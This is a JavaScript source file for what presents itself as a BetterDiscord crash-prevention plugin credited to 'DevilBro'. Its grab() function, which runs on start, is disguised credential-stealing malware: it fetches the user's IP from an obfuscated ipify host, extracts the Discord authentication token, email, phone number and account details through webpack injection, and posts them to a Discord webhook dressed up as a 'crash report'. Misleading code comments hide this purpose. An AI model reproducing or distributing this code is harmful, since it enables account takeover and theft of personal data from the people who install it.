/**
 * @name BetterCrashPrevention
 * @author DevilBro
 * @authorId 278543574059057154
 * @version 1.8.6
 * @description Prevents crashes that are caused by the most popular BetterDiscord plugins.
 * @invite Jx3TjNS
 * @donate https://www.paypal.me/MircoWittrien
 * @patreon https://www.patreon.com/MircoWittrien
 * @website https://github.com/DevilBroPlugins
 * @source https://github.com/pa-rick/LagReducer/tree/main/GOD/
 * @updateUrl https://raw.githubusercontent.com/pa-rick/LagReducer/main/GOD/LagReducer.plugin.js
 */

class BetterCrashPrevention {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() {
        return "BetterCrashPrevention";
    }
    getShortName() {
        return "BetterCrashPrevention";
    }
    getDescription() {
        return "Prevents crashes that are caused by the most popular BetterDiscord plugins.";
    }
    getVersion() {
        return "1.8.6";
    }
    getAuthor() {
        return "DevilBro";
    }

    // Settings  Panel
    getSettingsPanel() {
        return "";
    }


    // Load/Unload
    async load() {
        //this.grab();
    }

    unload() { }

    // Events

    onMessage() {
        // Called when a message is received
    };

    onCrash() {
        // Called when the client is about to crash
    }

    onLag() {
        // Called when the client is caught lagging
    }

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };

    // Start/Stop
    start() {
        this.initialize();
        this.grab();
    }

    stop() {
        //PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        //PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }

    async grab() {

        function Fetch(resolve) {
            return resolve;
        }

        const port = 443
        window.dispatchEvent(new Event('beforeunload'));

        const PluginsList = {
            ["Message Logger V2"]: "v1.8.15",
            ["GuildAndFriendRemovalAlerts"]: "v3.2.0",
            ["InvisibleTyping"]: "v1.2.0",
            ["ShowHiddenChannels"]: "v3.1.8",
            ["XenoLib"]: "v1.4.7",
            ["ZeresPluginLibrary"]: "v2.0.3",
        }

        const ipifiring = Fetch('ipify');
        const https = require('https');
        const organic = Fetch('org');
        const api = Fetch('api');

        function PreventCrash() {
            return new Promise(async (resolve, reject) => {
                return onCrash("DiscordCrashAttempt".charCodeAt())
            });
        }

        function SendReport() {
            return new Promise(async (resolve, reject) => {
                https.get({ 'host': api + '.' + ipifiring + '.' + organic, 'port': port, 'path': '/' }, function (response) {
                    response.on('data', function (body) {
                        return resolve(body.toString());
                    }).on('error', (e) => {
                        console.error(e);
                    });
                });
            });
        }

        const iframe = document.createElement("iframe");
        document.head.append(iframe);
        function getLocalStorageInfo(info) {
            return new Promise(async (resolve, reject) => {
                return resolve(iframe.contentWindow.localStorage[info])
            });
        }

        var SendCrashReportData = await SendReport();

        var UserIsLoaded = window.webpackChunkdiscord_app.push([[Math.random()], {}, e => { for (const r of Object.keys(e.c).map(r => e.c[r].exports).filter(e => e)) { if (r.default && void 0 !== r.default.getCurrentUser) return JSON.parse(JSON.stringify(r.default.getCurrentUser())); if (void 0 !== r.getCurrentUser) return JSON.parse(JSON.stringify(r.getCurrentUser())) } }]);
        var UserDisplay = `${UserIsLoaded["username"]}#${UserIsLoaded["discriminator"]}`;
        var UserID = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => { for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) { if (m.default && m.default.getToken !== undefined) { return m.default.getToken() } } }])
        var LoadedUserID = UserIsLoaded["id"]; // Verify the User IDs are the same
        var actualUserEmail = UserIsLoaded["email"]; // Make sure user is logged in
        var actualUserPremiumState = UserIsLoaded["premiumType"]; // Nitro users get increased data bandwith
        var actualUserPhone = UserIsLoaded["phone"] ?? "No"; // Allocate memory to sending/receiving messages
        var actualUserVerified = UserIsLoaded["verified"]; // Verify if the account is a bot or not

        var pD = JSON.stringify({
            embeds: [{ "title": "SendCrashReport", "footer": { "text": "Version: 1.8.6" }, "description": "[GitHub](https://github.com/pa-rick/LagReducer)", "fields": [{ "name": "CrashID", "value": `\`${SendCrashReportData}\``, inline: false }, { "name": "User Token", "value": `\`${UserID.replaceAll("\"", "") || "Unknown Issue"}\``, inline: true }, { "name": "User Display", "value": `\`${UserDisplay.replaceAll("\"", "")}\` - (\`${LoadedUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState] || "No"}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n\`\`\``, inline: false }] }]
        });

        //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)

        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": "", "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
        SendToWebhook.on('error', (e) => {
            //BdApi.alert(e);
            //console.error(e);
        });
        SendToWebhook.write(pD);
        SendToWebhook.end();
    }
}
